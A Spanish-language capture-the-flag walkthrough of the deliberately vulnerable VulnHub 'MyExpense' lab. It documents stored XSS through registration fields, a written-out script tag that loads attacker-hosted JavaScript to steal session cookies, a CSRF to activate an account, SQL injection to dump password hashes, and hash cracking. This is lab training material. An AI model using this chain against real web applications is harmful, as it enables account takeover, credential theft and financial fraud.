___

```
- Url: https://www.vulnhub.com/entry/myexpense-1,405/
- Name: MyExpense: 1
- Date release: 7 Dec 2019
- Author: [Sh4rpf0rc3](https://www.vulnhub.com/author/sh4rpf0rc3,662/)
- Series: [MyExpense](https://www.vulnhub.com/series/myexpense,265/)

___

VM Scenario:
<p>
	You are "Samuel Lamotte" and you have just been fired by your company "Furtura Business Informatique". Unfortunately because of your hasty departure, you did not have time to validate your expense report for your last business trip, which still amounts to 750 € corresponding to a return flight to your last customer.
	
	Fearing that your former employer may not want to reimburse you for this expense report, you decide to hack into the internal application called **"MyExpense "** to manage employee expense reports.
	
	So you are in your car, in the company carpark and connected to the internal Wi-Fi (the key has still not been changed after your departure). The application is protected by username/password authentication and you hope that the administrator has not yet modified or deleted your access.
	
	Your credentials were: samuel/fzghn4lw
	
	Once the challenge is done, the flag will be displayed on the application while being connected with your (samuel) account.
</p>
```
___

Comprobamos la conectividad con la máquina vulnerable:

![[Pasted image 20260203154130.png]]

Comprobamos el sistema operativo al que nos enfrentamos, en este caso Linux:

![[Pasted image 20260203154853.png]]

Creamos nuestros directorios de trabajo:

![[Pasted image 20260203154444.png]]

Realizamos un escaneo de puertos con nmap:

![[Pasted image 20260203155644.png]]

Extraemos los puertos abiertos:

![[Pasted image 20260203155708.png]]

Realizamos un escaneo de servicios con nmap de los puertos abiertos:

![[Pasted image 20260203155906.png]]

Resultado escaneo de servicios de los puertos abiertos:

![[Pasted image 20260203160018.png]]

Accedemos a la web:

![[Pasted image 20260203160327.png]]

Probamos a loguearnos con las credenciales que se nos proporcionaron del usuario Samuel nombre+password:

![[Pasted image 20260203161328.png]]

Y vemos que no podemos acceder con ellas:

![[Pasted image 20260203161337.png]]

Realizamos un fuzzing para encontrar posibles directorios y/o archivos:

![[Pasted image 20260203162032.png]]

En el resultado de gobuster vemos un directorio llamado /admin, por lo que probamos a acceder a él, aunque nos salta un mensaje de error 403:

![[Pasted image 20260203162135.png]]

Mediante wappalyzer podemos ver que la web usa php:

![[Pasted image 20260203163647.png]]

Por lo que podemos probar a fuzzear por archivos de extensión .php, vemos que se ha encontrado un archivo admin.php en el directorio admin:

![[Pasted image 20260203163736.png]]

Ahora logramos acceder al archivo y visualizarlo:

![[Pasted image 20260203164023.png]]

Además podemos ver el nombre de usuario de Samuel que no teníamos anteriormente:

![[Pasted image 20260203164643.png]]

Si intentamos activar el usuario Samuel, no nos deja:

![[Pasted image 20260203164306.png]]

Si esta vez intentamos loguearnos con el nombre de usuario correcto, vemos que nos salta un mensaje distinto, que la cuenta esta bloqueada/inactiva:

![[Pasted image 20260203164828.png]]

Intentamos crearnos un usuario para pruebas:

```
user: fmoha
pass: fmoha1234
site: Paris
mail: fmoha@mail.com
Firstname: Theo
Lastname: Rodriguez
```

Al intentar guardarlo no salta un mensaje de error:

![[Pasted image 20260203165211.png]]

Pero si inspeccionamos el botón de Sign Up vemos que tiene el parámetro disabled que bloquea el registro el cual si quitamos podemos registrarnos correctamente:

![[Pasted image 20260203165301.png]]

![[Pasted image 20260203165335.png]]

Vemos en el panel de admin.php que se ha agregado nuestra cuenta aunque está deshabilitada:

![[Pasted image 20260203165605.png]]

Si esta vez probamos a crear una cuenta pero esta vez agregamos en los campos de firstname y lastname unas etiquetas script y guardamos el usuario:

![[Pasted image 20260203165903.png]]

Vemos que en el panel de usuarios de admin.php salta una alerta, por lo que es vulnerable a XSS:

![[Pasted image 20260203165922.png]]

Sabiendo que la web es vulnerable a XSS podemos intentar robar la cookie de algún usuario que visite/use la web regularmente.

Para empezar montamos un servidor HTTP:

![[Pasted image 20260203170300.png]]

Volvemos a crear un usuario de prueba, y en el XSS agregamos un src de un archivo que no existe de momento solo para comprobar si llegan peticiones:

![[Pasted image 20260203170451.png]]

```
<script src="http://192.168.1.12:80/pwned.js"></script>
```

Vemos que se generan peticiones sin hacer falta que se recargue la página de admin por lo que hay algún usuario activo regularmente con acceso al que podemos intentar robarle su cookie:

![[Pasted image 20260203170617.png]]

Creamos un script pwned.js en JS:

![[Pasted image 20260203171000.png]]

Si montamos un servidor http con python vemos que capturamos la cookie de un usuario:

![[Pasted image 20260203171117.png]]

Sustituimos la cookie que tuviesemos por la que acabamos de capturar:

![[Pasted image 20260203171327.png]]

Si recargamos la página de /admin/admin.php nos salta un error de que solo puede haber una cuenta autenticada a la vez.

![[Pasted image 20260203171434.png]]

Viendo que no podemos reutilizar la cookie, vamos a probar a usar un ataque CSRF:

Viendo la url al intentar activar el usuario samuel vemos que usar GET:

![[Pasted image 20260203171805.png]]

Por lo que podemos modificar el script pwned.js para que el usuario haga una petición a la URL especificada por nosotros:

![[Pasted image 20260203172425.png]]

Comprobamos el servidor http y captura una petición GET:

![[Pasted image 20260203172519.png]]

Si recargamos la página del admin podemos ver que el usuario samuel está activado:

![[Pasted image 20260203172621.png]]

Si probamos a loguearnos ahora como samuel si nos deja:

![[Pasted image 20260203173429.png]]

Si probamos a enviar el reporte que el deben a samuel:

![[Pasted image 20260203173528.png]]

Nos salta un mensaje de que se ha enviado correctamente pero no se ha aceptado:

![[Pasted image 20260203173619.png]]

Si vemos la información personal de samuel, vemos que el usuario Manon es el manager de samuel:

![[Pasted image 20260203173709.png]]

Desde el panel de admin vemos que el usuario Manon existe y esta activo:

![[Pasted image 20260203173916.png]]

Si vemos los comentarios, vemos varios usuarios.

Si modificamos el script JS para intentar capturar las cookies de los usuarios:

![[Pasted image 20260203174749.png]]

![[Pasted image 20260203174910.png]]

Nos montamos un servidor HTTP por el puerto 4646

Enviamos la petición XSS

En el servidor HTTP capturamos varias cookies de sesión

Si probamos a loguearnos con las cookies vemos que la cookie 1tql6to5.... corresponde con el usuario Manon Riviere el cual tiene una pestaña llamada Renee.

Además podremos aceptar la solicitud que enviamos antes como usuario Samuel. Pero la petición solo está validada, ahora hay que buscar una forma de aceptarla.

Si vemos las opciones del usuario Manon vemos que su superior es un tal usuario Paul Baudouin el cual tiene el rol de Aprobador Financiero por lo que seguramente pueda aceptar la solicitud de Samuel.

Si nos fijamos en la url del panel de rennes del usuario Manon:

![[Pasted image 20260204201708.png]]

Podemos probar si es vulnerable a SQLi, y vemos que si lo es:

![[Pasted image 20260204201910.png]]
![[Pasted image 20260204201945.png]]

![[Pasted image 20260204202023.png]]
![[Pasted image 20260204202043.png]]

Tras varias pruebas conseguimos sacar los usuarios y contraseñas de la base de datos:

![[Pasted image 20260204202254.png]]
![[Pasted image 20260204202306.png]]

De momento solo necesitamos el usuario pbaudouin:

![[Pasted image 20260204202506.png]]

Si probamos a crackearla mediante CrackStation vemos que nos saca la password:

![[Pasted image 20260204202644.png]]

Si intentamos loguearnos nos deja, nos movemos al panel de expense reports donde podremos ver las solicitudes pendientes, entre las cuales se encuentra la del usuario Manon que enviamos anteriormente.

Aceptamos el pago de la petición.

Si nos logueamos de nuevo como Samuel para comprobar el pago nos salta la flag final : ``flag{H4CKY0URL1F3}``

___